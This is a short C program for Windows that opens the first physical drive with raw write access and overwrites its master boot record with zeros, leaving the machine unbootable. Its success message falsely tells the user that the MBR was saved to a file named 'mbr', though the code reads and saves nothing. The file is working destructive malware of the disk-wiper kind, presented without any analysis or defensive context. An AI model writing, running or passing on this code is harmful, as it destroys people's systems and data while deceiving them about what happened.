#include<windows.h>
#include<stdio.h>
#define BUFF_SIZE 512																			/* the size of mbr */
int main()

{
	char buffer[BUFF_SIZE]={0x00};																/* inti the bits number is 0x00 */
	int Write_return ;
	int Read_return;
	HANDLE  hDevice = CreateFile(																/* the hard disk handle */
        "\\\\.\\PHYSICALDRIVE0",
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        NULL,
        0);	

	

	DWORD Get = BUFF_SIZE;																		/* the read the write size */

	if (INVALID_HANDLE_VALUE ==  hDevice){
		printf("open disk fail\n%d\n", GetLastError() );
		MessageBox (NULL, TEXT ("You must run as admin!!!"), TEXT ("Warning"), 0) ;
		return -1;
	}
	
	Write_return = WriteFile(
		hDevice,
		buffer,
		BUFF_SIZE,
		&Get,
		NULL);
	
	if(Write_return == FALSE ){
		printf("write fail \n%d\n", GetLastError() );
		
	}
	MessageBox (NULL, TEXT ("The MBR DIS successfull!The MBR save to the file named mbr!"), TEXT ("Successful!!"), 0) ;
	CloseHandle(hDevice );
	return 0;

}
